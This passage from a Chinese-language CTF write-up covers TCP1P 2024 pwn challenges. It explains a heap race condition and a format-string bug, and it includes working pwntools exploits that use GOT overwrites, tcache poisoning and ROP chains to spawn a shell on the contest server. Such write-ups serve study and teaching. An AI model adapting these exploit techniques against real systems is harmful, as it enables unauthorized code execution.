class="number">0b1000_0000</span></span><br><span class="line">    res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit_got = elf.got.exit</span><br><span class="line">main = elf.sym.main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x70</span></span><br><span class="line">payload = <span class="number">0xD0</span></span><br><span class="line"></span><br><span class="line">tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_chk_fail = <span class="number">0x404018</span></span><br><span class="line">res = calc(<span class="number">0xB6</span>, <span class="number">0x30</span>)</span><br><span class="line">ls(res)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(stack_chk_fail).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x11</span>, <span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(stack_chk_fail + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x80</span>, <span class="number">0xD0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">setbuf_addr = elf.got.setbuf</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x20</span>, <span class="number">0xE0</span>)</span><br><span class="line"><span class="comment"># 0520 gets</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x05</span>, <span class="number">0x7F</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0xD0</span>, <span class="number">0x80</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404070</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">payload += p64(<span class="number">0x404060</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">8</span>)) - libc.sym._IO_2_1_stdout_</span><br><span class="line">system = libc_base + libc.sym.system</span><br><span class="line">gets = libc_base + libc.sym.gets</span><br><span class="line"></span><br><span class="line">ls(libc_base)</span><br><span class="line"></span><br><span class="line">res = calc(<span class="number">0x80</span>, <span class="number">0xD0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system0 = system &amp; <span class="number">0xFF</span></span><br><span class="line">system1 = (system &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">system2 = (system &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">gets2 = (gets &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">res = calc(system0, <span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(system1, <span class="number">0x05</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">1</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">res = calc(system2, gets2)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(setbuf_addr + <span class="number">2</span>).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">res = calc(<span class="number">0xD0</span>, <span class="number">0x80</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="sim"><a href="#sim" class="headerlink" title="sim"></a>sim</h1><hr>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>一个高版本堆题(libc2.35),保护全开，没有去除符号，没给libc给了Dockerfile,libc是从docker里扣出来的</p>
<p><img src="/images/2024TCP1P/sim1.png" alt="sim1"></p>
<p>可以看到程序在进入菜单堆之前创建了一个线程，本题的漏洞也是集中在线程的race condition上。</p>
<p>run_control函数标准的菜单堆，但是没有漏洞：</p>
<p><img src="/images/2024TCP1P/sim3.png" alt="sim3"></p>
<p>线程函数内容有两项，分别可以做到复制堆块内容和输出堆块内容，需要用前台launch和terminate函数触发：</p>
<p><img src="/images/2024TCP1P/sim2.png" alt="sim2"></p>
<p>这两个函数在执行的时候都有较长时间的sleep,因此可以利用race condition在sleep时修改其中一个堆块，绕过最开始的对长度的检查，实现heap overflow和overread</p>
<p><img src="/images/2024TCP1P/sim4.png" alt="sim4"></p>
<p>题目只能malloc0x80的堆块，首先连续申请删除七个堆块，然后输出第八个堆块。利用输出时的sleep将其free造出unsorted bin并输出从而拿到libc基地址。用同样的方法泄漏tcache bin的指针得到heap基地址，用于加密指针。</p>
<p>此时main_arena里有存放着七个tcache bin的单链表，顺序为tcache bin1 -&gt; tcache bin2 -&gt; ……，利用漏洞可以复制堆块上超过该堆块size的内容，我们构造堆风水，将tcache bin1的指针复制到tcache bin2处， 实现tcache bin1 -&gt; tcache bin2 -&gt; tcache bin2这样的类double free效果，进而UAF利用tcache bin poisoning实现任意写。</p>
<p>一开始尝试打IO链，但是在复制时总会把堆块的size位和题目给的长度标记复制到IO结构体需要置零&#x2F;放入有效地址的地方，无论如何偏移复制都会访问非法内存，出现sigsegv,因此决定打ROP.（还是ROP最靠谱）</p>
<p>任意分配堆块至environ指针附近，利用race condition的overread读取environ指针获得栈地址。第一次构造tcache bin poisoning时得到了指向同一个堆块的两个指针，可以UAF再次打一个tcache bin poisoning,分配到stack上写入ROP链，最终成功getshell.</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./sim/chall&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">55551</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, config</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size &gt;&gt; &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;config &gt;&gt; &quot;</span>, config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terminate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">launch(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_base = u64(p.recvn(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12 0x1f3</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x21ACE0</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">8</span>)) - main_arena</span><br><span class="line">stderr = libc.sym._IO_2_1_stderr_ + libc_base</span><br><span class="line">system = libc.sym.system + libc_base</span><br><span class="line">ptr = libc_base + <span class="number">0x21CA60</span></span><br><span class="line">environ = libc_base + libc.sym.environ</span><br><span class="line">pop_rdi = <span class="number">0x000000000002A3E5</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000F410B</span> + libc_base</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = heap_base + <span class="number">0x7E0</span></span><br><span class="line"></span><br><span class="line">_IO_wfile_overflow = <span class="number">0x217018</span> + libc_base</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line">fake_io_1 = p64(<span class="number">0</span>) + p64(_IO_wfile_overflow)</span><br><span class="line">fake_io_1 = fake_io_1.ljust(<span class="number">0x50</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io_1 += <span class="string">b&quot;  sh;&quot;</span>.ljust(<span class="number">0x8</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_2 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_io_2 = fake_io_2.ljust(<span class="number">0x68</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io_2 += p64(fake_wide_data_addr)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x130</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">launch(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_vtable_addr = heap_base + 0x860</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_wide_data = p64(0) * 2 + p64(fake_vtable_addr) + p64(system)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># create(3, 0x70, p64((stderr - 0x50) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x70</span>, p64((environ - <span class="number">0x20</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x20</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x10</span>, <span class="string">b&quot;env&quot;</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">6</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[+] Terminate Protocol Success&quot;</span>)</span><br><span class="line">launch(<span class="number">6</span>)</span><br><span class="line">terminate()</span><br><span class="line">launch(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"><span class="comment"># p.recvn(8)</span></span><br><span class="line"></span><br><span class="line">p.recvn(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">ret_addr = stack_addr - <span class="number">0x170</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x10</span>, p64((ret_addr - <span class="number">0x8</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">5</span>)</span><br><span class="line">launch(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ls(stack_addr)</span><br><span class="line">ls(heap_base)</span><br><span class="line">ls(libc_base)</span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="amnesia"><a href="#amnesia" class="headerlink" title="amnesia"></a>amnesia</h1><hr>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>保护全开，有沙箱但只禁用了execve和execveat.该题只patch libc和ld还不够，libseccomp版本和本机不对应，又从docker里把libseccomp.so抠出来patch的，这才能在本机运行了</p>
<p>本题有两个大小不一样的格式化字符串漏洞，其中第二个可以无限利用</p>
<p><img src="/images/2024TCP1P/amnesia1.png" alt="amnesia1"></p>
<p><img src="/images/2024TCP1P/amnesia2.png" alt="amnesia2"></p>
<p>有意思的是作者给了一个函数来检查”$px”是否存在于我们输入的字符串中，而且这个字符串“$px”存储在bss段而不是rodata,意味着我们能够更改它。第一个printf的offset为14,第二个printf的offset为8.</p>
<p>第一次利用该限制仅仅增大了一点receive的工作量。我们用连续的“%lu|”泄漏并在脚本中接收转换，可以拿到libc基地址，stack地址（rbp）和程序基地址（ret addr拿到）。</p>
<p>这个限制造成麻烦的只有‘$’字符，因为在第二个格式化字符串中，没有‘$’会导致无法在32字符的长度内构造出能写入任意内容的payload（只能任意写入数值10～19的qword或数值10的dword）。因此我们需要在第一次利用时修改字符串“$px”为0xa（该字符不会被scanf读取，是绝对安全的）</p>
<p>之后就格式化字符串布置ROP就行了。32个字符还是比较足够的。pwntools里的fmtstr_payload生成的payload只能写入单字节（其他的都超过32个字符了），也可以自己布置一次性写入word.ROP链的设置是mprotect(bss_addr, 0x1000, 0x7) -&gt; read(0, bss_addr, 0x1000) -&gt; bss_addr，然后整一段shellcode写入即可（也可以用libc中给的库函数open,read,write）</p>
<p>远程环境不知道有啥问题，每一个地址都没问题打了好几次才打通</p>
<p><img src="/images/2024TCP1P/amnesia3.png" alt="amnesia3"></p>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 